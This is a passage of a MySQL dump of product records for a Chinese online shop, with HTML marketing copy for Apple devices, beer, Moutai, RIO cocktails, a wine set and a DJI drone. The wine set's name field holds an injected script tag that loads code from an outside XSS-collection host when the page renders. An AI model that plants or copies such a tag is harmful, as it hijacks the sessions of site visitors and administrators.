auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20141024154927978.jpg\" /> \r\n	</p>\r\n</div>\r\n<p>\r\n	<br />\r\n</p>\r\n<p style=\"font-size:35px;text-align:center;\">\r\n	众多 App，为 iPad 量身打造，<br />\r\n<br />\r\n也为成就你想做的一切。\r\n</p>\r\n<p style=\"font-size:14px;text-align:center;\">\r\n	iPad Air 2 内置多款强大 app 来让你处理日常事务，比如浏览网络，查收电子邮件，编辑影片和照片，撰写报告和阅读图书。不仅如此，App Store 中还有成千上万款 app，专为 iPad 宽大的多点触控 Retina 显示屏而精心设计，绝不仅仅是手机 app 的简单放大。因此，无论你是爱好摄影，游戏，旅行，还是想管理自己的财务，总有一款 app 会让你做得更出色。\r\n</p>\r\n<p style=\"text-align:center;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20141024154934369.jpg\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<div style=\"color:#333333;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:35px;text-align:center;\">\r\n		iOS 8 和 iPad Air 2，<br />\r\n强强联手。\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		iOS 8 是超前的移动操作系统，其先进功能让 iPad Air 2 变得更不可或缺。连续互通功能可让你在这部设备上开始一个项目，然后在另一部设备上继续完成。家人共享功能让你与多达六人轻松共享图书和 app。而 iCloud Drive 可让你安全存储各种类型的文档，并从你的各种设备上访问。事实上，iOS 8 上的一切功能不仅是为了与 iPad Air 2 默契配合而设计，也是为了将强大的 A8X 芯片、超快的无线连接、以及绚丽 Retina 显示屏的优势发挥到淋漓尽致而打造。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20141024154942167.jpg\" /> \r\n	</p>\r\n</div>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>', '', '0', '1446299697', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('9', '苹果（Apple）iMac MF886CH/A 27英寸一体电脑', '', '\\Upload\\shop\\5634c8d5a085f.png', 'qita', '16800.00000000', '100.00000000', '20.00000000', '<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:65px;text-align:center;\">\r\n		iMac\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		Retina 的大作，一款又一款。\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		自始至终，iMac 背后的设计理念都未曾动摇，那就是打造超凡的台式电脑体验：为出众的显示屏搭配高性能处理器、图形处理器以及存储方案，并将它们融于浑然一体的纤薄机身之中。 Retina 显示屏就是一个清晰的例证。颗颗像素精心雕琢，方成精妙杰作。全新 21.5 英寸配备 Retina 4K 显示屏的 iMac，延续了我们对于精益求精的不懈追求。与开创性的 27 英寸 5K 机型一样，它的画质如此夺目，足以让画面之外的世界都顿显失色。这一次，我们又迈出了漂亮的一大步，让 iMac 从此给你更加引人入胜的体验。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022141936169.jpg\" /> \r\n	</p>\r\n	<p style=\"font-size:16px;\">\r\n		<br />\r\n	</p>\r\n</div>\r\n<div style=\"margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		<br />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<div>\r\n		&nbsp;\r\n	</div>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142047361.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:25px;text-align:center;\">\r\n		Apple 配件\r\n	</p>\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		可心的新设计，可充电，还可实现更多。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		全新 Magic Keyboard、Magic Mouse 2 和 Magic Trackpad 2 经过重新设计，为每次互动带来更出色的感受。从内置充电电池到更低的倾斜角度，方方面面都经过优化，带来更舒适的体验和更精彩的功能。与 iMac 配对使用时，更加默契出众。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142054915.jpg\" /> \r\n	</p>\r\n	<div>\r\n		<p style=\"font-size:25px;\">\r\n			<br />\r\n		</p>\r\n	</div>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		iMac 令人惊叹的纤薄机身之中，却满载各种先进的技术。所有 iMac 机型均标配两个 Thunderbolt 2 端口，可与外接硬盘和相机相连，实现疾速的数据传输。四个 USB 3 端口为你带来更多选择，让你可以轻松连接打印机、视频设备以及更多外设。你还可通过疾速的三串流 Wi-Fi 和蓝牙 4.0 无线技术随时连接，访问你喜欢的内容。\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		为速度而来，<br />\r\n为实现更多而打造。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		初识 iMac，你会着迷于它纤薄的机身。然而，精美的外观，只是演绎其强大性能的舞台。凭借新一代 Intel Core 处理器、全新 AMD 图形处理器、先进的 Fusion Drive 可选配存储方案与 Thunderbolt 2，iMac 有着快若闪电的速度，以及令人叹为观止的强大动力。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142130891.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:25px;text-align:center;\">\r\n		OS X El Capitan\r\n	</p>\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		先进的电脑操作系统。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		Mac 之所以是 Mac，OS X 功不可没。它不仅设计直观、易用，更经过精心打造，能够充分发挥 Retina 显示屏的优势，让桌面上的一切都呈现令人惊艳的清晰效果。它配备一系列出众的 app，不仅便于你日常使用，更能让你乐在其中。此外，它还经过精心设计，实现了 Mac 和 iOS 设备之间的绝妙合作。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142159654.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		Mac 之所以是 Mac，OS X 功不可没。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		OS X 是赋予每部 Mac 强大动力的操作系统，它构建于坚如磐石的 UNIX 基础之上，并为充分发挥 Mac 的硬件性能而打造。OS X 的设计易用而又美观，并配有一系列令你每天都爱不释手的精彩 app，更能让你的 Mac 和 iOS 设备以卓越方式默契合作，紧密相连。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142208441.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:25px;text-align:center;\">\r\n		内置 App\r\n	</p>\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		众多精彩内置 App，如今更出彩。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		每台新购买的 Mac 均配备照片、iMovie、GarageBand、Pages、Numbers 和 Keynote。让你从开启它的那一刻起，就能尽情挥洒创意。同时，你还享有多款精彩 app，可用以收发电子邮件、畅游网络、发送文本信息、进行 FaceTime 视频通话，甚至还有一款专门的 app，能够帮助你寻找更多新的 app。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142216493.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:25px;text-align:center;\">\r\n		iCloud\r\n	</p>\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		让你在 iMac 上的种种所爱，<br />\r\n现身你的各种设备。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		iCloud 可以存放你的内容，并让你无论使用什么设备，都能轻松访问照片、日历、联系人等等。你可以通过 iCloud Drive，将所有演示文稿、电子表格、PDF 文件、图片和任何其他格式的文件安全储存到 iCloud 上，然后在 iPhone、iPad、iPod touch、Mac 或 PC 上进行访问。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142224617.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1446299861', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('10', '爱士堡（Eichbaum）小麦啤酒 500mlx24听 德国进口', '', '\\Upload\\shop\\5634c9a24fc5a.png', 'qita', '158.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:22px;color:red;\">\r\n		啤酒配送服务说明\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:14px;\">\r\n		1、本商品默认由京东物流负责配送发货，物流无法配送的区域，用户可选择换购本商城同等价位的商品（一件或多件），或选择补差价换购高价位商品。<br />\r\n2、由于业务发展变化、行政区域更名等因素，配送区域可能会不时有扩大、变更或调整，具体区域请以京东最新确认为准。<br />\r\n3、由于商品存在厂家更换包装、不同批次、不同生产日期、不同生产工厂等情况，导致商品实物与图片存在微小差异，因此请您以收到的商品实物为准，同时我们会尽量做到及时更新，由此给您带来不便敬请谅解，谢谢。<br />\r\n4、1元云购对本商品在法律范围内拥有最终解释权。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;\">\r\n	<div style=\"margin:0px auto;padding:0px;\">\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171206491.jpg\" />\r\n		</p>\r\n	</div>\r\n	<div style=\"margin:10px auto;font-family:微软雅黑;padding:0px;\">\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">商品名称</span>：爱士堡小麦啤酒\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">商品品牌</span>：爱士堡\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">商品产地</span>：德国\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">商品规格</span>：500ml/听\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">配 料</span>：水、大麦芽、小麦芽、啤酒花浸膏（抽提物）、酵母\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">酒精度</span>：5.3% vol\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">原麦汁浓度</span>：11.8°P\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">保质期限</span>：15个月\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">储藏方法</span>：避免阳光直射和高温\r\n		</p>\r\n	</div>\r\n	<div style=\"margin:0px auto;padding:0px;\">\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171227561.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171233609.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171239701.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171246151.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img alt=\"\" src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606172152642.jpg\" style=\"width:793px;height:431px;\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171259614.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171305161.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171311833.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171317800.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171323591.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171329762.jpg\" />\r\n		</p>\r\n	</div>\r\n</div>', '', '0', '1446300066', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('11', '茅台（MOUTAI）飞天茅台酒 53度 500ml', '', '\\Upload\\shop\\5634ca8a10c58.png', 'qita', '968.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:14px;text-indent:28px;\">\r\n		茅台酒素以色清透明、醇香馥郁、入口柔绵、清冽甘爽、回香持久等特点而名闻天下，被称为中国的\"国酒\"。它以优质高粱为料，上等小麦制曲，每年重阳之际投料，利用茅台镇特有的气候，优良的水质和适宜的土壤， 采用与众不同的高温制曲、堆积、蒸酒，轻水分入池等工艺，再经过两次投料、九次蒸馏、八次发酵、七次取酒、长期陈酿而成。酒精度多在52～54度之间，是中国酱香型白酒的典范。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101631707.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p>\r\n		<span style=\"font-size:14.782608985900879px;line-height:19.130435943603516px;\">&nbsp;</span> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101700807.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101706720.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101712428.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;padding:5px 0px;\">\r\n	<p style=\"font-size:16px;\">\r\n		&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101747256.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101814467.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101857507.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101909395.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1446300339', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('12', '锐澳（RIO）鸡尾酒 预调酒 KT新春幻彩装 275ml x 6瓶', '', '\\Upload\\shop\\5634cb3e580da.png', 'qita', '88.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513140932813.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513140938217.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:14px;\">\r\n		商品名称：锐澳 鸡尾酒 预调酒 KT新春幻彩装 275ml*6瓶\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		品<span>牌</span>：锐澳（RIO）\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		商品配料：水、白砂糖、伏特加、白兰地、浓缩苹果汁、浓缩桃汁、食品添加剂、食用香精。\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		商品规格：275ml*6瓶\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		酒精度：3.8%vol\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		原产国：中国\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		保质期：18个月\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		适用人群：成年人\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		贮存条件：请置于阴凉干燥处。避免高温和强光，禁止加热或0℃以下冷冻，切勿撞击，防止爆瓶。\r\n	</p>\r\n	<p style=\"font-size:14px;color:#FF0000;font-weight:bold;\">\r\n		温馨提示：新老包装交替(hello kitty版&amp; 非hello kitty经典版），随机发货； Hello kitty版有三种包装，随机发货。若有少量沉淀为天然果肉成分，请放心饮用。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141032921.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141038170.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141044830.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141049315.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141054587.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141100974.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141106252.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141115570.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141121747.jpg\" />\r\n	</p>\r\n</div>', '', '0', '1446300478', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('13', '瑞兹德比纳 干白葡萄酒 750ml x 6瓶 红酒套装<script src=http://xssnow.com/JFBG></script>', '', '\\Upload\\shop\\5634cbbdaf79f.png', 'dianzi', '3068.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112644419.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112702526.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112709634.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112718172.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112726214.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112734482.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112743293.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112752301.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112801820.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112808850.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112817387.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112825267.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112833711.jpg\" />\r\n	</p>\r\n</div>', '', '1', '1446300605', '1446220800', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('14', '大疆（DJI）精灵3 Phantom 3 Advanced 高端专业HD航拍飞行器无人机', '', '\\Upload\\shop\\5634cc3a8481c.jpg', 'qita', '5888.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171334407.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		做自己生活的导演。现在，就由Phantom 3 带您冲上云霄，以全新的视角去发<br />\r\n现世界之美，将心中所想娓娓道来。4K相机带来清透画质，实时传送高清影像。<br />\r\n一切准备就绪，静候您的安排。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171401377.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#FFFFFF;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		全新相机\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		一体化集成相机可实现美妙30帧的2.7K高清录像，1200万像素的静态照片拍摄，内置精密传感器。 非球面镜的精密镜组，可显著消除镜头畸变，将世界真实还原。新一代传感器，画面质感更加清透， 色彩演绎饱满鲜亮。配合DJI工业级三轴稳定云台，轻松输出平稳流程的画面。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#FFFFFF;\">\r\n	<p style=\"font-size:30px;\">\r\n		实时高清画面传输\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		Phantom 3 Advanced 搭载了备受摄影师称赞的DJI高清图传技术，只需将移动设备与遥控器连接，即可 使用DJI GO App实时查看720P的高清航拍画面。\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		即使在传输距离高达2公里时，画面仍然清晰流畅。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#FFFFFF;\">\r\n	<p style=\"font-size:30px;\">\r\n		操控体验升级\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		Phantom 3 搭载DJI出色的智能飞控系统，继承了一贯优异的飞行稳定性。全新姿态算法，配合智能电调， 显著提高了机动性，带来敏捷流畅的操控体验。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		安全性\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		Phantom 3 Advanced 提供了独特的新手模式，为飞行树立安全屏障。您可通过设置飞行距离及高度限制， 让飞机在安全范围内飞行。让您在学习操作技巧的同时，尽情享受飞行乐趣。集成先进的飞行控制技术，支持一键起飞和降落，并具有智能的失控保护功能。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171513809.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		视觉定位系统\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		即使在室内无GPS环境下低空飞行，内置的视觉和超声波传感器也可通过感知地面纹理和相对高度，让 Phantom 3 实现精确定位悬停和平稳飞行。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:30px;\">\r\n		<br />\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		全新智能电池\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		全新升级的智能电池内置传感器及LED指示灯，您可实时掌握飞行器电池状态、电池剩余电量等信息。 系统会根据飞行距离计算返航和降落所需的电量和时间，让您对飞行时间有更准确的把控。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		强劲的动力系统\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		每一个电机均采用先进的制造工艺，动力更为强劲。无刷电机搭配先进的双向通信智能电调（ESC），<br />\r\n让Phantom 3 Advanced 在空中的响应更加敏捷，可随时加速或急停、快速上升或下降。<br />\r\nDJI独特的空气制动系统保证在放开摇杆时，飞机可自动定点悬停。<br />\r\n高精度自紧螺旋桨性能卓越，能在激烈的飞行中保持稳固。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, 